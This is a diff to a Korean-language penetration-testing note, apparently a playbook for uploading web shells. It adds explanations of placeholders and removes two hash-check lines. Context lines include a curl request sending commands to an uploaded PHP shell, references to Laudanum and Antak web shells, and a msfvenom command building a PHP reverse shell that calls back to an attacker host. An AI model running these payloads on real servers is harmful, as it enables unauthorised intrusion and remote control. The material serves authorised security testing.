@@ -33,6 +33,8 @@ tags:
 
 ## 실행
 
+초기 작업 디렉터리 block은 공격 호스트에서 실행한다. `<WEBSHELL_WORKDIR>`은 작업 전 존재하지 않는 절대 경로(가상 예: `/tmp/webshell-20260914a`), `<UNIQUE_ID>`·`<UNIQUE_PROOF>`는 기존 원격 파일과 겹치지 않는 식별자·파일명이다. proof 업로드 성공은 Web Shell 실행을 뜻하지 않는다.
+
 1. 식별 가능한 텍스트 파일로 업로드와 접근 경로를 확인한다.
 2. 서버 스택에 맞는 최소 Web Shell을 준비한다.
 3. 확장자, MIME, magic bytes, 경로 제약을 확인한다.
@@ -45,7 +47,6 @@ tags:
 test ! -e '<WEBSHELL_WORKDIR>'
 install -d -m 700 -- '<WEBSHELL_WORKDIR>'
 printf 'web-upload-proof-<UNIQUE_ID>\n' > '<WEBSHELL_WORKDIR>/<UNIQUE_PROOF>'
-sha256sum -- '<WEBSHELL_WORKDIR>/<UNIQUE_PROOF>'
 ```
 
 ### 파일 쓰기 출처별 시작점
@@ -161,6 +162,8 @@ curl -G "http://<TARGET>/uploads/<UNIQUE_SHELL>.php" --data-urlencode "cmd=test 
 
 Laudanum과 Antak의 system-wide 원본은 직접 수정하지 않는다. 설치 경로는 배포판 package에 따라 다를 수 있으므로 실제 source file을 확인하고 고유 작업 directory로 복사한다. 다음 두 분기는 대안이며 같은 `<UNIQUE_SHELL>.aspx` 경로에 차례로 실행하지 않는다.
 
+`<LAUDANUM_SOURCE>`·`<NISHANG_SOURCE>`는 공격 호스트의 실제 source 디렉터리, `<UNIQUE_SHELL>`은 work copy의 새 basename이다. source→work copy hash는 원본 수정 여부와 이후 변경을 판단하므로 유지한다.
+
 Laudanum:
 
 ```bash
@@ -187,7 +190,6 @@ sha256sum -- '<NISHANG_SOURCE>/Antak-WebShell/antak.aspx' '<WEBSHELL_WORKDIR>/<U
 
 ```bash
 msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<LISTEN_PORT> -f raw -o '<WEBSHELL_WORKDIR>/<UNIQUE_SHELL>.php'
-sha256sum -- '<WEBSHELL_WORKDIR>/<UNIQUE_SHELL>.php'
 ```
 
 확인할 출력:
